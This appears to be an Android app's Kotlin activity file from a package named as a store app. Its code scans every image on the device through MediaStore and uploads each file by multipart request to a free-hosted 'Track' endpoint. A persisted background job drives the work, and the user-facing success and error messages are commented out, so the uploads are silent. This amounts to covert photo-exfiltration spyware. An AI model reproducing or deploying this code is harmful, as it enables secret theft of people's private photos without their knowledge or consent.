package com.artix.store

import android.annotation.SuppressLint
import android.app.Application
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.ContentUris
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.provider.MediaStore
import android.util.Log
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.artix.networkrequest.Interface.OnError
import com.artix.networkrequest.Interface.OnSuccess
import com.artix.networkrequest.Main
import com.artix.store.Helper.OnselectFile
import com.artix.store.Helper.picItCall
import com.artix.store.JobSheduler.JobService
import com.artix.store.JobSheduler.ShowNotification
import com.hbisoft.pickit.PickiT
import kotlinx.coroutines.Runnable
import java.io.File


class MainActivity2 : AppCompatActivity(), OnError, OnSuccess {
    lateinit var main :Main;
    @SuppressLint("MissingInflatedId")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main2)
        Progress = findViewById(R.id.progressBar);
        textView = findViewById(R.id.textView);
        main = Main(this,this,this)
        val picItCall = picItCall(object : OnselectFile {
            override fun OnSelect(path: String?) {
                val pats: MutableList<String> = ArrayList()
                pats.add(path!!)
                val f: MutableList<File> = java.util.ArrayList()
                f.add(File(path))
                try {
                    //val s = UploadAsync(applicationContext,pats).execute().get()

                    //Log.d("UPLOAD", "on Complete: $s")
                    val param = HashMap<String, Any>()
                    param["abc"] = "abcd"
                    main.CAllMultipartRequest(
                        "https://artixdevl.000webhostapp.com/Track/index.php",
                        "",
                   param,
                    f,
                     "files[]"
                    )
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        })

        pickiT = PickiT(this,  picItCall, this)


        //pyu.draw(Canvas())
        //queryImageStorage()
      startBackgroundJob()
    }




    fun startBackgroundJob() {
        val componentName = ComponentName(this, JobService::class.java)
        val info = JobInfo.Builder(1, componentName)
            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
            .setPersisted(true)
            //.setPeriodic((15 * 60 * 1000).toLong())
            .build()
        val scheduler = getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
        val resultCode = scheduler.schedule(info)
        if (resultCode == JobScheduler.RESULT_SUCCESS) {
            Log.d("Background Job", "result success ")
        } else {
            Log.d("Background Job", "result failed ")
        }
    }

companion object{

    var tot: Int=0
    lateinit var Progress :ProgressBar
    lateinit var textView :TextView
    var handler = Handler()
   @SuppressLint("StaticFieldLeak")
    var sow: ShowNotification? = null

    var pickiT: PickiT? = null

    fun queryImageStorage(cont: Application) {

        Thread {

          handler.post(object : Runnable {
              override fun run() {
                  Toast.makeText(cont,"Called",Toast.LENGTH_SHORT).show()
              }
          })
            val imageProjection = arrayOf(
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media._ID
            )

            val imageSortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"

            val cursor = cont.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                imageProjection,
                null,
                null,
                imageSortOrder
            )

            cursor.use {

                it?.let {
                    Log.i("Cursor", "queryImageStorage: Size - "+it.count)
                    tot = it.count;

                   handler.post(object : Runnable {
                       override fun run() {
                           Progress.max = tot;
                       }
                   })







                    val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)

                    while (it.moveToNext()) {
                       handler.post(object : java.lang.Runnable {
                           @RequiresApi(Build.VERSION_CODES.N)
                           override fun run() {
                               textView.text = ""+it.position;
                               Progress.setProgress(it.position,true);
                           }
                       })


                        val id = it.getLong(idColumn)
                        val name = it.getString(nameColumn)
                        val size = it.getString(sizeColumn)
                        val date = it.getString(dateColumn)

                        val contentUri = ContentUris.withAppendedId(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            id
                        )
                        // add the URI to the list
                        // generate the thumbnail
                        // Log.e("TAG", "File NAme" + name)
                        pickiT!!.getPath(contentUri,  Build.VERSION.SDK_INT)
                        //  Toast.makeText(this,""+name,Toast.LENGTH_SHORT).show()
                        //return;

                        /* Thread.sleep(1000)
                         sow!!.UpdateNotification(tot, it.position)*/

                    }
                } ?: kotlin.run {
                    Log.e("TAG", "Cursor is null!")
                    Toast.makeText(cont,"Null Cursor",Toast.LENGTH_SHORT).show()
                }
            }

        }.start()

    }
}

    override fun OnEror(url: String?, code: String?, message: String?) {
       //Toast.makeText(applicationContext,"Error "+message, Toast.LENGTH_SHORT).show()
        Log.d("Upload", "OnEror: "+message)

    }

    override fun OnSucces(url: String?, code: String?, res: String?) {
        //Toast.makeText(applicationContext,"Success "+res, Toast.LENGTH_SHORT).show()
        Log.d("Upload", "OnSucces: "+res)
    }


}